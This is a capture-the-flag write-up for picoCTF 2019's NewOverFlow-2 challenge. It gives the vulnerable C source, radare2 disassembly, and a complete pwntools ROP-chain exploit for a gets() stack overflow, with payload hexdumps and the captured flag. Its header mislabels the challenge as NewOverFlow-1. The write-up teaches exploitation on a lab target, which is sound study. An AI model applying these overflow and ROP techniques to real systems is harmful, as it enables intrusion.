# NewOverFlow-1
Binary Exploitation, 250 points

## Description:
> Okay now lets try mainpulating arguments.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdbool.h>

#define BUFFSIZE 64
#define FLAGSIZE 64

bool win1 = false;
bool win2 = false;

void win_fn1(unsigned int arg_check) {
  if (arg_check == 0xDEADBEEF) {
    win1 = true;
  }
}

void win_fn2(unsigned int arg_check1, unsigned int arg_check2, unsigned int arg_check3) {
  if (win1 && \
      arg_check1 == 0xBAADCAFE && \
      arg_check2 == 0xCAFEBABE && \
      arg_check3 == 0xABADBABE) {
    win2 = true;
  }
}

void win_fn() {
  char flag[48];
  FILE *file;
  file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("'flag.txt' missing in the current directory!\n");
    exit(0);
  }

  fgets(flag, sizeof(flag), file);
  if (win1 && win2) {
    printf("%s", flag);
    return;
  }
  else {
    printf("Nope, not quite...\n");
  }
}

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("'flag.txt' missing in the current directory!\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Welcome to 64-bit. Can you match these numbers?");
  vuln();
  return 0;
}
```


## Solution:

This is the follow-up for [NewOverFlow-1](NewOverFlow-1.md).

We need to create a ROP chain, sending parameters to the different functions in order to set two booleans to `true` before we can jump to the `win_fn` and read the flag.

I started by using the previous challenge's template, and creating a ROP chain using `pwntools`:

```python
rop = ROP(context.binary)
rop.win_fn1(0xDEADBEEF)
rop.win_fn2(0xBAADCAFE, 0xCAFEBABE, 0xABADBABE)
rop.win_fn()
```

However, `pwntools` couldn't satisfy one of the constraints:
```console
[*] Overflow offset: 72 (8-byte architecture)
[*] win_fn1() address: 0x400767
[*] win_fn2() address: 0x400781
[*] win_fn() address: 0x4007be
[*] Loaded cached gadgets for 'vuln'
[ERROR] Could not satisfy setRegisters({'rdi': 3131951870, 'rsi': 3405691582, 'rdx': 2880289470})
```

I then noticed that the `flag` function from the previous challenge wasn't removed, and reused the same script to get the flag:
```console
root@kali:/media/sf_CTFs/pico/NewOverFlow-2# python exploit.py
[*] '/media/sf_CTFs/pico/NewOverFlow-2/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Connecting to 2019shell1.picoctf.com on port 22: Done
[*] dvdalt@2019shell1.picoctf.com:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
[+] Opening new channel: 'pwd': Done
[+] Receiving all data: Done (13B)
[*] Closed SSH channel with 2019shell1.picoctf.com
[*] Working directory: '/tmp/tmp.mmIN0FCE1u'
[+] Opening new channel: 'ln -s /home/dvdalt/* .': Done
[+] Receiving all data: Done (0B)
[*] Closed SSH channel with 2019shell1.picoctf.com
[*] Working directory: '/problems/newoverflow-2_4_2cbec72146545064c6623c465faba84e'
[+] Starting local process '/media/sf_CTFs/pico/NewOverFlow-2/vuln': pid 1225
[*] Process '/media/sf_CTFs/pico/NewOverFlow-2/vuln' stopped with exit code -11 (SIGSEGV) (pid 1225)
[+] Parsing corefile...: Done
[*] '/media/sf_CTFs/pico/NewOverFlow-2/core.1225'
    Arch:      amd64-64-little
    RIP:       0x4008cd
    RSP:       0x7fff65080078
    Exe:       '/media/sf_CTFs/pico/NewOverFlow-2/vuln' (0x400000)
    Fault:     0x616161616161616a
[*] Overflow offset: 72 (8-byte architecture)
[*] flag() address: 0x40084d
[+] Starting remote process '/problems/newoverflow-2_4_2cbec72146545064c6623c465faba84e/vuln' on 2019shell1.picoctf.com:
 pid 3871758
[*] Sending payload:
    00000000  42 42 42 42  42 42 42 42  42 42 42 42  42 42 42 42  │BBBB│BBBB│BBBB│BBBB│
    *
    00000040  42 42 42 42  42 42 42 42  ce 08 40 00  00 00 00 00  │BBBB│BBBB│··@·│····│
    00000050
[*] Sending payload:
    00000000  42 42 42 42  42 42 42 42  42 42 42 42  42 42 42 42  │BBBB│BBBB│BBBB│BBBB│
    *
    00000040  42 42 42 42  42 42 42 42  4d 08 40 00  00 00 00 00  │BBBB│BBBB│M·@·│····│
    00000050
[+] Receiving all data: Done (39B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 3871758)

picoCTF{r0p_1t_d0nT_st0p_1t_df73a1da}
```

After the end of the competition, I revisited the challenge and solved it using a classic ROP chain.

Let's take a closer look at `win_fn2`:

```console
root@kali:/media/sf_CTFs/pico/NewOverFlow-2# r2 ./vuln
 -- Step through your seek history with the commands 'u' (undo) and 'U' (redo)
[0x00400680]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x00400680]> s sym.win_fn2
[0x00400781]> agf
[0x00400781]>  # sym.win_fn2 (uint32_t arg1, uint32_t arg2, uint32_t arg3);
     .--------------------------------------------------------------.
     |  0x400781                                                    |
     | (fcn) sym.win_fn2 61                                         |
     |   sym.win_fn2 (uint32_t arg1, uint32_t arg2, uint32_t arg3); |
     | ; var uint32_t var_ch @ rbp-0xc                              |
     | ; var uint32_t var_8h @ rbp-0x8                              |
     | ; var uint32_t var_4h @ rbp-0x4                              |
     | ; arg uint32_t arg1 @ rdi                                    |
     | ; arg uint32_t arg2 @ rsi                                    |
     | ; arg uint32_t arg3 @ rdx                                    |
     | push rbp                                                     |
     | mov rbp, rsp                                                 |
     | ; arg1                                                       |
     | mov dword [var_4h], edi                                      |
     | ; arg2                                                       |
     | mov dword [var_8h], esi                                      |
     | ; arg3                                                       |
     | mov dword [var_ch], edx                                      |
     | ; [0x601079:1]=0                                             |
     | movzx eax, byte [obj.win1]                                   |
     | test al, al                                                  |
     | je 0x4007bb                                                  |
     `--------------------------------------------------------------'
             f t
             | |
             | '--------------------------------.
            .'                                  |
            |                                   |
        .-----------------------------------.   |
        |  0x400799                         |   |
        | cmp dword [var_4h], 0xbaadcafe    |   |
        | jne 0x4007bb                      |   |
        `-----------------------------------'   |
                f t                             |
                | |                             |
                | '-------------------------.   |
        .-------'                           |   |
        |                                   |   |
    .-----------------------------------.   |   |
    |  0x4007a2                         |   |   |
    | cmp dword [var_8h], 0xcafebabe    |   |   |
    | jne 0x4007bb                      |   |   |
    `-----------------------------------'   |   |
            f t                             |   |
            | |                             |   |
            | '-------------------------.   |   |
    .-------'                           |   |   |
    |                                   |   |   |
.-----------------------------------.   |   |   |
|  0x4007ab                         |   |   |   |
| cmp dword [var_ch], 0xabadbabe    |   |   |   |
| jne 0x4007bb                      |   |   |   |
`-----------------------------------'   |   |   |
        f t                             |   |   |
        | |                             |   |   |
        | '-------------------------.   |   |   |
        |                           |   |   |   |
        |                           |   |   |   |
    .---------------------------.   |   |   |   |
    |  0x4007b4                 |   |   |   |   |
    | ; [0x60107a:1]=0          |   |   |   |   |
    | mov byte [obj.win2], 1    |   |   |   |   |
    `---------------------------'   |   |   |   |
        v                           |   |   |   |
        |                           |   |   |   |
      .-'                           |   |   |   |
      | .---------------------------'   |   |   |
      | | .-----------------------------'   |   |
      | | | .-------------------------------'   |
      | | | | .---------------------------------'
      | | | | |
.------------------------------------------------------------------------.
|  0x4007bb                                                              |
| ; CODE XREFS from sym.win_fn2 @ 0x400797, 0x4007a0, 0x4007a9, 0x4007b2 |
| nop                                                                    |
| pop rbp                                                                |
| ret                                                                    |
`------------------------------------------------------------------------'
```

We don't need to set the parameters for the function, we can just jump directly to `0x4007b4` and set `win2` to `true`. We only need to manually take care of the `pop rbp` that comes later.

So, the exploit is:

```python
# First, generate a pwntools template using:
# pwn template --host 2019shell1.picoctf.com --user dvdalt --path /problems/newoverflow-2_4_2cbec72146545064c6623c465faba84e/vuln

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)


import os

if shell is not None:
    shell.set_working_directory(os.path.dirname(remote_path))

def send_payload(proc, payload):
    proc.sendlineafter("Welcome to 64-bit. Can you match these numbers?", payload)


def get_overflow_offset():
    # It's problematic to create a core dump on an NTFS file system,
    # so reconfigure core dumps to be created elsewhere
    os.system("echo ~/core/core_dump > /proc/sys/kernel/core_pattern")
    os.system("rm core.* > /dev/null")
    proc = process(exe.path)
    payload = cyclic(200, n = exe.bytes)
    send_payload(proc, payload)
    proc.wait()
    offset = cyclic_find(proc.corefile.fault_addr, n = exe.bytes )
    log.info("Overflow offset: {} ({}-byte architecture)".format(offset, exe.bytes))
    return offset


overflow_offset = get_overflow_offset()
log.info("win_fn1() address: {}".format(hex(exe.symbols["win_fn1"])))
log.info("win_fn2() address: {}".format(hex(exe.symbols["win_fn2"])))
log.info("win_fn() address: {}".format(hex(exe.symbols["win_fn"])))


rop = ROP(context.binary)
rop.win_fn1(0xDEADBEEF)
rop.raw(0x004007b4)     # Inside win_fn2
rop.raw(0xABABABAB)     # Popped into RBP
rop.win_fn()

log.info("ROP: \n{}".format(rop.dump()))


io = start()

payload = fit({overflow_offset: exe.symbols["main"]}, filler = 'B')
log.info("Sending payload: \n{}".format(hexdump(payload)))
send_payload(io, payload)

payload = fit({overflow_offset: exe.symbols["main"]}, filler = 'B')
log.info("Sending payload: \n{}".format(hexdump(payload)))
send_payload(io, payload)


payload = fit({overflow_offset: str(rop)}, filler = 'A')
log.info("Sending payload: \n{}".format(hexdump(payload)))
send_payload(io, payload)

print io.recvall()
```

Just like the previous challenge, we have to make some dummy calls to `main` in order to align the stack for `printf`.

Output:
```console
root@kali:/media/sf_CTFs/pico/NewOverFlow-2# python exploit.py
[*] '/media/sf_CTFs/pico/NewOverFlow-2/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Connecting to 2019shell1.picoctf.com on port 22: Done
[*] dvdalt@2019shell1.picoctf.com:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
[+] Opening new channel: 'pwd': Done
[+] Receiving all data: Done (13B)
[*] Closed SSH channel with 2019shell1.picoctf.com
[*] Working directory: '/tmp/tmp.kevtwNHuSk'
[+] Opening new channel: 'ln -s /home/dvdalt/* .': Done
[+] Receiving all data: Done (0B)
[*] Closed SSH channel with 2019shell1.picoctf.com
[*] Working directory: '/problems/newoverflow-2_4_2cbec72146545064c6623c465faba84e'
[+] Starting local process '/media/sf_CTFs/pico/NewOverFlow-2/vuln': pid 3393
[*] Process '/media/sf_CTFs/pico/NewOverFlow-2/vuln' stopped with exit code -11 (SIGSEGV) (pid 3393)
[+] Parsing corefile...: Done
[*] '/media/sf_CTFs/pico/NewOverFlow-2/core.3393'
    Arch:      amd64-64-little
    RIP:       0x4008cd
    RSP:       0x7ffe146f0718
    Exe:       '/media/sf_CTFs/pico/NewOverFlow-2/vuln' (0x400000)
    Fault:     0x616161616161616a
[*] Overflow offset: 72 (8-byte architecture)
[*] win_fn1() address: 0x400767
[*] win_fn2() address: 0x400781
[*] win_fn() address: 0x4007be
[*] Loaded cached gadgets for 'vuln'
[*] ROP:
    0x0000:         0x4009a3 pop rdi; ret
    0x0008:       0xdeadbeef [arg0] rdi = 3735928559
    0x0010:         0x400767 win_fn1
    0x0018:         0x4007b4
    0x0020:       0xabababab
    0x0028:         0x4007be win_fn()
[+] Starting remote process '/problems/newoverflow-2_4_2cbec72146545064c6623c465faba84e/vuln' on 2019shell1.picoctf.com: pid 3733698
[*] Sending payload:
    00000000  42 42 42 42  42 42 42 42  42 42 42 42  42 42 42 42  │BBBB│BBBB│BBBB│BBBB│
    *
    00000040  42 42 42 42  42 42 42 42  ce 08 40 00  00 00 00 00  │BBBB│BBBB│··@·│····│
    00000050
[*] Sending payload:
    00000000  42 42 42 42  42 42 42 42  42 42 42 42  42 42 42 42  │BBBB│BBBB│BBBB│BBBB│
    *
    00000040  42 42 42 42  42 42 42 42  ce 08 40 00  00 00 00 00  │BBBB│BBBB│··@·│····│
    00000050
[*] Sending payload:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000040  41 41 41 41  41 41 41 41  a3 09 40 00  00 00 00 00  │AAAA│AAAA│··@·│····│
    00000050  ef be ad de  00 00 00 00  67 07 40 00  00 00 00 00  │····│····│g·@·│····│
    00000060  b4 07 40 00  00 00 00 00  ab ab ab ab  00 00 00 00  │··@·│····│····│····│
    00000070  be 07 40 00  00 00 00 00                            │··@·│····││
    00000078
[+] Receiving all data: Done (39B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 3733698)

picoCTF{r0p_1t_d0nT_st0p_1t_df73a1da}
```